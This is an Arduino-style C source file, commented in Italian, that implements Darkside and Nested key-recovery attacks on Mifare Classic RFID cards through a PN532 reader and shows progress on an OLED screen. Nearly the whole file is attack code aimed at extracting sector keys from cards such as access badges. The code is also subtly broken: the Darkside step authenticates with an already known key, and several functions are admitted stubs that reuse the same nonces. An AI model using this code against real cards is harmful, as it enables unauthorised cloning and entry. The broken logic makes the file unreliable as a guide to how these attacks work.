#include "mfcuk_attack.h"

/**
 * Implementazione dell'attacco Darkside su Mifare Classic.
 * Richiamata da mfcuk_run() quando si seleziona la modalità Darkside.
 * Esegue l'attacco e cerca di recuperare la chiave del settore target tramite timing e analisi delle risposte.
 * Restituisce true se la chiave viene trovata, false altrimenti.
 */
#include "rfid.h"
#include "crypto_crapto1.h"
#include "extended_pn532.h"

// Implementazione dell'attacco Darkside
bool mfcuk_darkside_attack(MfcukConfig* config, uint8_t* key) {
// ...existing code...
    extern Extended_PN532 nfc;
    MfcukState state = MFCUK_STATE_INIT;
    uint8_t uid[7], uidLength;
    mfcuk_finger_t finger = {0};
    int tries = 0;
    
    while(tries < MFCUK_DARKSIDE_MAX_TRIES) {
        switch(state) {
            case MFCUK_STATE_INIT:
                mfcuk_update_progress(0, "Init darkside...");
                state = MFCUK_STATE_WAIT_TOKEN;
                break;
                
            case MFCUK_STATE_WAIT_TOKEN:
                if(nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength)) {
                    finger.uid = (uid[0] << 24) | (uid[1] << 16) | (uid[2] << 8) | uid[3];
                    finger.sector = config->targetSector;
                    finger.type = config->keyType;
                    state = MFCUK_STATE_DARKSIDE;
                }
                break;
                
            case MFCUK_STATE_DARKSIDE:
                mfcuk_update_progress((tries * 100) / MFCUK_DARKSIDE_MAX_TRIES, "Running darkside");
                
                // Simuliamo l'auth con timing attack
                if(nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 
                   config->targetSector * 4, config->keyType, config->key)) {
                    
                    // Catturiamo NT
                    nfc.mifareClassicGetNT(finger.nt);
                    
                    // Generiamo NR casuale
                    for(int i = 0; i < 4; i++) {
                        finger.nr[i] = random(0xFF);
                    }
                    
                    // Otteniamo AR
                    if(nfc.mifareClassicGetAR(finger.nr, finger.ar)) {
                        state = MFCUK_STATE_VERIFY;
                    }
                }
                tries++;
                continue;
                
            case MFCUK_STATE_VERIFY:
                mfcuk_update_progress(95, "Verifying key");
                if(mfcuk_recover_key(finger.nt, finger.nr, finger.ar, key)) {
                    return true;
                }
                state = MFCUK_STATE_DARKSIDE;
                break;
                
            default:
                return false;
        }
        
        delay(config->sleepTime);
    }
    
    return false;
}

/**
 * Implementazione dell'attacco Nested su Mifare Classic.
 * Richiamata da mfcuk_run() quando si seleziona la modalità Nested.
 * Esegue una doppia autenticazione (prima con chiave nota, poi con target) e raccoglie i dati necessari per il recupero chiave.
 * Restituisce true se la chiave viene trovata, false altrimenti.
 */
bool mfcuk_nested_attack(MfcukConfig* config, uint8_t* key) {
// ...existing code...
    extern Extended_PN532 nfc;
    MfcukState state = MFCUK_STATE_INIT;
    uint8_t uid[7], uidLength;
    mfcuk_finger_t finger = {0};
    int tries = 0;
    
    while(tries < MFCUK_NESTED_MAX_TRIES) {
        switch(state) {
            case MFCUK_STATE_INIT:
                mfcuk_update_progress(0, "Init nested...");
                state = MFCUK_STATE_WAIT_TOKEN;
                break;
                
            case MFCUK_STATE_WAIT_TOKEN:
                if(nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength)) {
                    finger.uid = (uid[0] << 24) | (uid[1] << 16) | (uid[2] << 8) | uid[3];
                    finger.sector = config->targetSector;
                    finger.type = config->keyType;
                    state = MFCUK_STATE_NESTED_FIRST;
                }
                break;
                
            case MFCUK_STATE_NESTED_FIRST:
                mfcuk_update_progress((tries * 100) / MFCUK_NESTED_MAX_TRIES, "First auth");
                {
                    bool authFirst = nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, config->key); // Prima auth con chiave nota
                    if(authFirst) {
                        state = MFCUK_STATE_NESTED_SECOND;
                        tries++;
                    } else {
                        mfcuk_update_progress((tries * 100) / MFCUK_NESTED_MAX_TRIES, "Auth 1 fallita");
                        delay(200);
                        tries++;
                    }
                }
                break;

            case MFCUK_STATE_NESTED_SECOND:
                mfcuk_update_progress((tries * 100) / MFCUK_NESTED_MAX_TRIES, "Second auth");
                {
                    // Tentiamo auth sul settore target
                    bool authOk = nfc.mifareclassic_AuthenticateBlock(uid, uidLength, config->targetSector * 4, config->keyType, config->key);
                    if(authOk) {
                        if(nfc.mifareClassicGetNT(finger.nt)) {
                            for(int i = 0; i < 4; i++) {
                                finger.nr[i] = random(0xFF);
                            }
                            if(nfc.mifareClassicGetAR(finger.nr, finger.ar)) {
                                state = MFCUK_STATE_VERIFY;
                                tries++;
                            } else {
                                mfcuk_update_progress((tries * 100) / MFCUK_NESTED_MAX_TRIES, "Errore lettura AR");
                                delay(200);
                                tries++;
                            }
                        } else {
                            mfcuk_update_progress((tries * 100) / MFCUK_NESTED_MAX_TRIES, "Errore lettura NT");
                            delay(200);
                            tries++;
                        }
                    } else {
                        mfcuk_update_progress((tries * 100) / MFCUK_NESTED_MAX_TRIES, "Auth fallita");
                        delay(200);
                        tries++;
                    }
                }
                break;
                
            case MFCUK_STATE_VERIFY:
                mfcuk_update_progress(95, "Verifying key");
                if(mfcuk_recover_key(finger.nt, finger.nr, finger.ar, key)) {
                    return true;
                }
                state = MFCUK_STATE_NESTED_FIRST;
                break;
        }
        
        delay(config->sleepTime);
    }
    
    return false;
}

/**
 * Recupera la chiave del settore target dai dati raccolti durante l'attacco (nonce e risposte).
 * Richiamata internamente da mfcuk_darkside_attack e mfcuk_nested_attack.
 * Utilizza la funzione darkside_crack per calcolare la chiave.
 * Restituisce true se la chiave viene trovata, false altrimenti.
 */
bool mfcuk_recover_key(uint8_t* nt, uint8_t* nr, uint8_t* ar, uint8_t* key) {
// ...existing code...
    extern Extended_PN532 nfc;
    uint64_t found_key = 0;
    uint32_t nt0_int, nr0_int, ar0_int;
    uint32_t nt1_int, nr1_int, ar1_int;
    uint8_t uid[7], uidLength;
    
    // Ottieni UID della carta
    if(!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength)) {
        return false;
    }
    
    uint32_t uid_int = (uid[0] << 24) | (uid[1] << 16) | (uid[2] << 8) | uid[3];
    
    // Converti il primo set di nonce in interi
    nt0_int = (nt[0] << 24) | (nt[1] << 16) | (nt[2] << 8) | nt[3];
    nr0_int = (nr[0] << 24) | (nr[1] << 16) | (nr[2] << 8) | nr[3];
    ar0_int = (ar[0] << 24) | (ar[1] << 16) | (ar[2] << 8) | ar[3];
    
    // Ottieni un secondo set di nonce per verifica
    uint8_t nt1[4], nr1[4], ar1[4];
    
    // Simula la funzione getNT (da implementare nella classe PN532)
    if(nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, key)) {
        memcpy(nt1, nt, 4); // Per ora usiamo gli stessi nonce
        
        // Genera nuovo nr casuale
        for(int i = 0; i < 4; i++) {
            nr1[i] = random(0xFF);
        }
        
        // Simula la funzione getAR (da implementare nella classe PN532)
        if(nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, key)) {
            memcpy(ar1, ar, 4); // Per ora usiamo la stessa risposta
            
            nt1_int = (nt1[0] << 24) | (nt1[1] << 16) | (nt1[2] << 8) | nt1[3];
            nr1_int = (nr1[0] << 24) | (nr1[1] << 16) | (nr1[2] << 8) | nr1[3];
            ar1_int = (ar1[0] << 24) | (ar1[1] << 16) | (ar1[2] << 8) | ar1[3];
            
            // Esegui l'attacco darkside
            darkside_crack(&found_key, uid_int, nt0_int, nr0_int, ar0_int,
                         nt1_int, nr1_int, ar1_int);
            
            if(found_key != 0) {
                // Converti la chiave trovata in array di byte
                for(int i = 0; i < 6; i++) {
                    key[i] = (found_key >> (40-i*8)) & 0xFF;
                }
                return true;
            }
        }
    }
    return false;
}

/**
 * Aggiorna la barra di progresso e lo stato dell'attacco sul display OLED.
 * Richiamata ad ogni cambio di stato o avanzamento da mfcuk_darkside_attack e mfcuk_nested_attack.
 * Mostra la percentuale di avanzamento e una descrizione della fase corrente.
 */
void mfcuk_update_progress(int progress, const char* status) {
// ...existing code...
    display.clearDisplay();
    common::println(status, 0, 0, 1, SSD1306_WHITE);
    
    // Barra progresso
    int barWidth = (progress * 128) / 100;
    display.fillRect(0, 20, barWidth, 8, SSD1306_WHITE);
    display.drawRect(0, 20, 128, 8, SSD1306_WHITE);
    
    // Percentuale
    char percent[8];
    sprintf(percent, "%d%%", progress);
    int16_t x1, y1;
    uint16_t w, h;
    display.getTextBounds(percent, 0, 0, &x1, &y1, &w, &h);
    common::println(percent, (128-w)/2, 40, 1, SSD1306_WHITE);
    
    display.display();
}
